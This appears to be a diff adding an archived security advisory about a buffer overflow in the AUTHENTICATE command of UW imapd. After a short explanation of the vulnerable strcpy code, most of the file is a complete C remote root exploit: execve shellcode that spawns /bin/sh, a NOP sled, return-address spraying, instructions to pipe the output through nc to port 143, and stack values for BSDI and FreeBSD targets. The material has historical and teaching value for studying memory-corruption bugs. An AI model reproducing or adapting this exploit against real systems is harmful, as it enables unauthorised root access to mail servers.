@@ -1,0 +1,123 @@
+source: http://www.securityfocus.com/bid/130/info
+
+A vulnerability exists in certain imapd implementations that allow an attacker to execute arbitrary code remotely. In certain instances, the code to be executed will be run with root privilege.
+
+Imap supports a command 'AUTHENTICATE' which specifies the type of authentication mechanism to be used to open a mailbox. The value passed to the authenticate command is copied into a buffer of size 1024. The maximum size of this value, however, it 8192 characters. A failure to bound the read value to 1024 results in a buffer overflow.
+
+The code which creates this problem is as follows:
+
+char *mail_auth (char *mechanism,authresponse_t resp,int argc,char *argv[])
+{
+char tmp[MAILTMPLEN];
+AUTHENTICATOR *auth;
+/* make upper case copy of mechanism name */
+ucase (strcpy (tmp,mechanism));
+for (auth = mailauthenticators; auth; auth = auth->next)
+if (auth->server && !strcmp (auth->name,tmp))
+return (*auth->server) (resp,argc,argv);
+return NIL; /* no authenticator found */
+}
+
+The 'strcpy' command on the sixth line of code will copy the value of 'mechanism', which is up to 8192 characters in to the 'tmp' buffer, which is only 1024 characters.
+
+All versions of UW imapd up to, and including 10.234 should be considered vulnerable.
+
+/**
+*** i386 BSD remote root exploit for UW imapd IMAP 4.1 server
+***
+*** This is *not* the same bug addressed in CERT Advisory CA-97.09!
+***
+*** Usage: % (imappy nop esp offset; cat) | nc hostname 143
+***
+*** where nop is the number of NOP opcodes to place at the start of the
+*** exploit buffer (I use 403), esp is the %esp stack pointer value, and
+*** offset is the number of bytes to add to esp to calculate your target
+*** %eip.
+***
+*** Demonstration values for UW imapd 10.234 (part of Pine 4.00):
+***
+*** imappy 403 0xefbfd5e8 100 (BSDI 3.0)
+*** imappy 403 0xefbfd4b8 100 (FreeBSD 2.2.5)
+***
+*** THIS CODE FOR EDUCATIONAL USE ONLY IN AN ETHICAL MANNER
+***
+*** Cheez Whiz
+*** cheezbeast@hotmail.com
+***
+*** July 16, 1998
+**/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <limits.h>
+#include <string.h>
+
+#define BUFLEN (2*1024)
+#define NOP 0x90
+
+char shell[] =
+/* 0 */ "\xeb\x34" /* jmp springboard */
+/* start: */
+/* 2 */ "\x5e" /* popl %esi */
+/* 3 */ "\x8d\x1e" /* leal (%esi),%ebx */
+/* 5 */ "\x89\x5e\x0b" /* movl %ebx,0xb(%esi) */
+/* 8 */ "\x31\xd2" /* xorl %edx,%edx */
+/* 10 */ "\x89\x56\x07" /* movl %edx,0x7(%esi) */
+/* 13 */ "\x89\x56\x0f" /* movl %edx,0xf(%esi) */
+/* 16 */ "\x89\x56\x14" /* movl %edx,0x14(%esi) */
+/* 19 */ "\x88\x56\x19" /* movb %dl,0x19(%esi) */
+/* 22 */ "\x31\xc0" /* xorl %eax,%eax */
+/* 24 */ "\xb0\x7f" /* movb $0x7f,%al */
+/* 26 */ "\x20\x46\x01" /* andb %al,0x1(%esi) */
+/* 29 */ "\x20\x46\x02" /* andb %al,0x2(%esi) */
+/* 32 */ "\x20\x46\x03" /* andb %al,0x3(%esi) */
+/* 35 */ "\x20\x46\x05" /* andb %al,0x5(%esi) */
+/* 38 */ "\x20\x46\x06" /* andb %al,0x6(%esi) */
+/* 41 */ "\xb0\x3b" /* movb $0x3b,%al */
+/* 43 */ "\x8d\x4e\x0b" /* leal 0xb(%esi),%ecx */
+/* 46 */ "\x89\xca" /* movl %ecx,%edx */
+/* 48 */ "\x52" /* pushl %edx */
+/* 49 */ "\x51" /* pushl %ecx */
+/* 50 */ "\x53" /* pushl %ebx */
+/* 51 */ "\x50" /* pushl %eax */
+/* 52 */ "\xeb\x18" /* jmp exec */
+/* springboard: */
+/* 54 */ "\xe8\xc7\xff\xff\xff" /* call start */
+/* data: */
+/* 59 */ "\x2f\xe2\xe9\xee\x2f\xf3\xe8" /* DATA (disguised /bin/sh) */
+/* 66 */ "\x01\x01\x01\x01" /* DATA */
+/* 70 */ "\x02\x02\x02\x02" /* DATA */
+/* 74 */ "\x03\x03\x03\x03" /* DATA */
+/* exec: */
+/* 78 */ "\x9a\x04\x04\x04\x04\x07\x04"; /* lcall 0x7,0x0 */
+
+char buf[BUFLEN];
+unsigned long int nop, esp;
+long int offset;
+
+void
+main (int argc, char *argv[])
+{
+int i;
+
+if (argc < 4) {
+printf("usage: %s nop esp offset\n", argv[0]);
+return;
+}
+
+nop = strtoul(argv[1], NULL, 0);
+esp = strtoul(argv[2], NULL, 0);
+offset = strtol(argv[3], NULL, 0);
+
+memset(buf, NOP, BUFLEN);
+memcpy(buf+nop, shell, strlen(shell));
+for (i = nop+strlen(shell); i < BUFLEN - 4; i += 4)
+*((int *) &buf[i]) = esp + offset;
+
+printf("* AUTHENTICATE {%d}\r\n", BUFLEN);
+for (i = 0; i < BUFLEN; i++)
+putchar(buf[i]);
+printf("\r\n");
+
+return;
+}
